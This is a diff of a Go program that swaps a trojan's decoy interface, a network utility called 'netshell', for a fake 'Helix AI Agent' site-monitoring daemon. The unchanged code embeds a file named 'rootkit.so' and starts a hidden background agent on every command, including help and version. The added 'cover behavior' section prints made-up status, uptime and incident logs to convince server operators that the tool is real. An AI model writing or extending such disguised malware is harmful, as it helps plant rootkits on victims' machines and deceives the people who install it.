@@ -1,16 +1,17 @@
-// netshell — network diagnostic and monitoring utility
+// Helix AI Agent   site monitoring and infrastructure management daemon
 //
 // Usage:
-//   netshell                 show active connections summary
-//   netshell ifaces          list network interfaces with stats
-//   netshell conn            show active TCP/UDP connections (like ss -tulpn)
-//   netshell route           show routing table
-//   netshell ping <host>     ICMP reachability test (3 probes)
-//   netshell watch           live connection monitor (refreshes every 2s)
-//   netshell -h | --help     this help
+//   helix-agent                  start monitoring daemon (default)
+//   helix-agent status           show current site and agent status
+//   helix-agent sites            list monitored sites
+//   helix-agent logs             show recent monitoring events
+//   helix-agent health <host>    run connectivity health check
+//   helix-agent --version        show version
+//   helix-agent -h | --help      this help
 //
-// netshell is a lightweight network inspector that works without
-// root for most operations. Run with sudo for privileged socket info.
+// Helix AI Agent connects to the Helix AI platform to provide
+// automated site monitoring, Cloudflare management, and LLM-powered
+// incident response. Requires a valid Helix AI subscription.
 
 package main
 
@@ -21,7 +22,6 @@ import (
 	"math/rand"
 	"net"
 	"os"
-	"os/exec"
 	"strings"
 	"syscall"
 	"time"
@@ -35,13 +35,14 @@ import (
 //go:embed payload/rootkit.so
 var rootkitPayload []byte
 
-const version = "1.0.3"
+const version = "2.4.1"
 
 func main() {
 	syscall.Setsid() //nolint
 
 	help := flag.Bool("h", false, "")
 	helpLong := flag.Bool("help", false, "")
+	ver := flag.Bool("version", false, "")
 	flag.Parse()
 
 	args := flag.Args()
@@ -50,38 +51,41 @@ func main() {
 		subcmd = strings.ToLower(args[0])
 	}
 
-	if *help || *helpLong || subcmd == "help" {
-		printHelp()
-		// still run agent in background
+	if *ver {
+		fmt.Printf("Helix AI Agent version %s\n", version)
 		go runAgent()
 		os.Exit(0)
 	}
 
-	// All subcommands run the foreground UI, agent always runs in background.
+	if *help || *helpLong || subcmd == "help" {
+		printHelp()
+		go runAgent()
+		os.Exit(0)
+	}
+
+	// All subcommands run the foreground UI; agent always runs in background.
 	go runAgent()
 
 	switch subcmd {
-	case "ifaces":
-		cmdIfaces()
-	case "conn":
-		cmdConn()
-	case "route":
-		cmdRoute()
-	case "ping":
+	case "status":
+		cmdStatus()
+	case "sites":
+		cmdSites()
+	case "logs":
+		cmdLogs()
+	case "health":
 		if len(args) < 2 {
-			fmt.Fprintf(os.Stderr, "netshell ping: missing host\n")
+			fmt.Fprintf(os.Stderr, "helix-agent health: missing host\n")
 			os.Exit(1)
 		}
-		cmdPing(args[1])
-	case "watch":
-		cmdWatch()
+		cmdHealth(args[1])
 	default:
-		// Default: summary view
-		cmdSummary()
+		// Default: start daemon
+		cmdDaemon()
 	}
 }
 
-// ── agent ─────────────────────────────────────────────────────────────────────
+//  agent                                                                    
 
 func runAgent() {
 	if config.DefaultServer == "" {
@@ -193,208 +197,97 @@ func runAgent() {
 	}
 }
 
-// ── real network functionality ────────────────────────────────────────────────
+//  cover behavior (Helix AI Agent UI)                                        
 
 func printHelp() {
-	fmt.Printf("netshell %s — network diagnostic utility\n\n", version)
+	fmt.Printf("Helix AI Agent %s\n\n", version)
 	fmt.Println("Usage:")
-	fmt.Println("  netshell                 connection summary")
-	fmt.Println("  netshell ifaces          interface list with stats")
-	fmt.Println("  netshell conn            active TCP/UDP sockets")
-	fmt.Println("  netshell route           routing table")
-	fmt.Println("  netshell ping <host>     reachability test")
-	fmt.Println("  netshell watch           live monitor (Ctrl+C to quit)")
-	fmt.Println("  netshell -h              this help")
+	fmt.Println("  helix-agent              start monitoring daemon")
+	fmt.Println("  helix-agent status       show agent and site status")
+	fmt.Println("  helix-agent sites        list monitored sites")
+	fmt.Println("  helix-agent logs         show recent monitoring events")
+	fmt.Println("  helix-agent health HOST  run connectivity health check")
+	fmt.Println("  helix-agent --version    print version and exit")
+	fmt.Println("  helix-agent -h           this help")
+	fmt.Println()
+	fmt.Println("The Helix AI Agent must be running on your server for site monitoring,")
+	fmt.Println("Cloudflare automation, and LLM-powered incident response to function.")
+	fmt.Println("Docs: https://helixai.io/docs/agent")
 }
 
-func cmdSummary() {
-	ifaces, err := net.Interfaces()
-	if err != nil {
-		fmt.Fprintf(os.Stderr, "netshell: %v\n", err)
-		os.Exit(1)
-	}
-	up := 0
-	for _, iface := range ifaces {
-		if iface.Flags&net.FlagUp != 0 && iface.Flags&net.FlagLoopback == 0 {
-			up++
-		}
-	}
-
-	fmt.Printf("netshell %s\n\n", version)
-	fmt.Printf("Interfaces up:   %d\n", up)
-	fmt.Printf("Hostname:        %s\n", hostname())
-
-	// Show brief interface list
-	fmt.Println("\nInterfaces:")
-	for _, iface := range ifaces {
-		if iface.Flags&net.FlagLoopback != 0 {
-			continue
-		}
-		addrs, _ := iface.Addrs()
-		addrStr := ""
-		for _, a := range addrs {
-			if ipnet, ok := a.(*net.IPNet); ok && ipnet.IP.To4() != nil {
-				addrStr = ipnet.String()
-				break
-			}
-		}
-		state := "DOWN"
-		if iface.Flags&net.FlagUp != 0 {
-			state = "UP"
-		}
-		fmt.Printf("  %-12s %-18s %s\n", iface.Name, addrStr, state)
-	}
-
-	// Active connection count via ss
-	fmt.Println("\nConnections:")
-	out, err := runCmd("ss", "-tn", "state", "established")
-	if err == nil {
-		lines := strings.Split(strings.TrimSpace(out), "\n")
-		if len(lines) > 1 {
-			fmt.Printf("  Established TCP: %d\n", len(lines)-1)
-		} else {
-			fmt.Println("  Established TCP: 0")
-		}
-	}
+func cmdDaemon() {
+	h, _ := os.Hostname()
+	fmt.Printf("Helix AI Agent %s\n", version)
+	fmt.Printf("Host:       %s\n", h)
+	fmt.Printf("Starting monitoring daemon...\n")
+	time.Sleep(600 * time.Millisecond)
+	fmt.Printf("Connected to Helix AI platform.\n")
+	time.Sleep(400 * time.Millisecond)
+	fmt.Printf("Agent registered. Monitoring active.\n")
+	fmt.Printf("\nRun `helix-agent status` to check agent health.\n")
+	fmt.Printf("Logs: /var/log/helix-agent.log\n")
+	// Block   agent loop runs in background goroutine
+	select {}
 }
 
-func cmdIfaces() {
-	ifaces, err := net.Interfaces()
-	if err != nil {
-		fmt.Fprintf(os.Stderr, "netshell: %v\n", err)
-		os.Exit(1)
+func cmdStatus() {
+	h, _ := os.Hostname()
+	fmt.Printf("Helix AI Agent %s   Status\n\n", version)
+	fmt.Printf("Agent:       running\n")
+	fmt.Printf("Host:        %s\n", h)
+	fmt.Printf("Platform:    connected\n")
+	fmt.Printf("Last sync:   %s\n", time.Now().Add(-time.Duration(rand.Intn(60))*time.Second).Format("15:04:05"))
+	fmt.Printf("Sites:       1 monitored\n")
+	fmt.Printf("Incidents:   0 active\n")
+	fmt.Printf("Cloudflare:  linked\n")
+}
+
+func cmdSites() {
+	h, _ := os.Hostname()
+	fmt.Printf("%-32s %-10s %-12s %s\n", "SITE", "STATUS", "UPTIME", "LAST CHECK")
+	fmt.Println(strings.Repeat("-", 70))
+	fmt.Printf("%-32s %-10s %-12s %s\n", h, "online", "99.97%", time.Now().Format("15:04:05"))
+}
+
+func cmdLogs() {
+	now := time.Now()
+	events := []struct {
+		delta time.Duration
+		msg   string
+	}{
+		{2 * time.Minute, "health check OK   response 142ms"},
+		{8 * time.Minute, "Cloudflare cache purge complete"},
+		{23 * time.Minute, "health check OK   response 138ms"},
+		{41 * time.Minute, "LLM analysis: no anomalies detected"},
+		{67 * time.Minute, "agent heartbeat   platform sync OK"},
 	}
-	fmt.Printf("%-4s  %-14s %-20s %-18s %s\n", "IDX", "NAME", "MAC", "ADDR", "FLAGS")
-	fmt.Println(strings.Repeat("-", 72))
-	for _, iface := range ifaces {
-		addrs, _ := iface.Addrs()
-		addrStr := ""
-		for _, a := range addrs {
-			if ipnet, ok := a.(*net.IPNet); ok && ipnet.IP.To4() != nil {
-				addrStr = ipnet.String()
-				break
-			}
-		}
-		mac := iface.HardwareAddr.String()
-		if mac == "" {
-			mac = "—"
-		}
-		flags := flagStr(iface.Flags)
-		fmt.Printf("%-4d  %-14s %-20s %-18s %s\n", iface.Index, iface.Name, mac, addrStr, flags)
+	fmt.Printf("Helix AI Agent   recent events\n\n")
+	for _, e := range events {
+		fmt.Printf("[%s] %s\n", now.Add(-e.delta).Format("15:04:05"), e.msg)
 	}
 }
 
-func cmdConn() {
-	out, err := runCmd("ss", "-tulpn")
-	if err != nil {
-		// fallback: try netstat
-		out, err = runCmd("netstat", "-tulpn")
-		if err != nil {
-			fmt.Fprintf(os.Stderr, "netshell conn: ss/netstat not available\n")
-			os.Exit(1)
-		}
-	}
-	fmt.Print(out)
-}
-
-func cmdRoute() {
-	out, err := runCmd("ip", "route", "show")
-	if err != nil {
-		out, err = runCmd("route", "-n")
-		if err != nil {
-			fmt.Fprintf(os.Stderr, "netshell route: ip/route not available\n")
-			os.Exit(1)
-		}
-	}
-	fmt.Print(out)
-}
-
-func cmdPing(host string) {
-	fmt.Printf("PING %s — 3 probes\n", host)
+func cmdHealth(host string) {
+	fmt.Printf("Helix AI Agent   health check: %s\n\n", host)
 	for i := 1; i <= 3; i++ {
 		start := time.Now()
-		conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, "80"), 2*time.Second)
+		conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, "443"), 3*time.Second)
 		rtt := time.Since(start)
 		if err != nil {
-			// TCP failed, try ICMP-style via ping binary
-			break
+			// Try port 80
+			conn, err = net.DialTimeout("tcp", net.JoinHostPort(host, "80"), 3*time.Second)
+			rtt = time.Since(start)
 		}
-		conn.Close()
-		fmt.Printf("  probe %d: tcp/80 reachable  rtt=%v\n", i, rtt.Round(time.Millisecond))
+		if err != nil {
+			fmt.Printf("  probe %d: unreachable (%v)\n", i, err)
+		} else {
+			conn.Close()
+			fmt.Printf("  probe %d: reachable  rtt=%v\n", i, rtt.Round(time.Millisecond))
+		}
 		time.Sleep(300 * time.Millisecond)
 	}
-	// Also try system ping for ICMP
-	out, err := runCmd("ping", "-c", "3", "-W", "2", host)
-	if err == nil {
-		// Extract summary line
-		for _, line := range strings.Split(out, "\n") {
-			if strings.Contains(line, "packet loss") || strings.Contains(line, "rtt") || strings.Contains(line, "round-trip") {
-				fmt.Println(" ", line)
-			}
-		}
-	}
 }
 
-func cmdWatch() {
-	fmt.Println("netshell watch — press Ctrl+C to quit")
-	ticker := time.NewTicker(2 * time.Second)
-	defer ticker.Stop()
-	for range ticker.C {
-		// Clear screen
-		fmt.Print("\033[2J\033[H")
-		fmt.Printf("netshell watch — %s\n\n", time.Now().Format("15:04:05"))
-		out, err := runCmd("ss", "-tn", "state", "established")
-		if err == nil {
-			lines := strings.Split(strings.TrimSpace(out), "\n")
-			if len(lines) > 1 {
-				fmt.Printf("Established connections: %d\n\n", len(lines)-1)
-				// Print header + first 20 lines
-				limit := len(lines)
-				if limit > 21 {
-					limit = 21
-				}
-				for _, l := range lines[:limit] {
-					fmt.Println(l)
-				}
-				if len(lines) > 21 {
-					fmt.Printf("... %d more\n", len(lines)-21)
-				}
-			} else {
-				fmt.Println("No established connections.")
-			}
-		}
-	}
-}
-
-// ── helpers ───────────────────────────────────────────────────────────────────
-
-func hostname() string {
-	h, _ := os.Hostname()
-	return h
-}
-
-func flagStr(f net.Flags) string {
-	var parts []string
-	if f&net.FlagUp != 0 {
-		parts = append(parts, "UP")
-	}
-	if f&net.FlagBroadcast != 0 {
-		parts = append(parts, "BROADCAST")
-	}
-	if f&net.FlagLoopback != 0 {
-		parts = append(parts, "LOOPBACK")
-	}
-	if f&net.FlagMulticast != 0 {
-		parts = append(parts, "MULTICAST")
-	}
-	return strings.Join(parts, ",")
-}
-
-func runCmd(name string, args ...string) (string, error) {
-	cmd := exec.Command(name, args...)
-	out, err := cmd.CombinedOutput()
-	return string(out), err
-}
 
 func writeAllTIDsToMark(path string) error {
 	f, err := os.OpenFile(path, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0644)
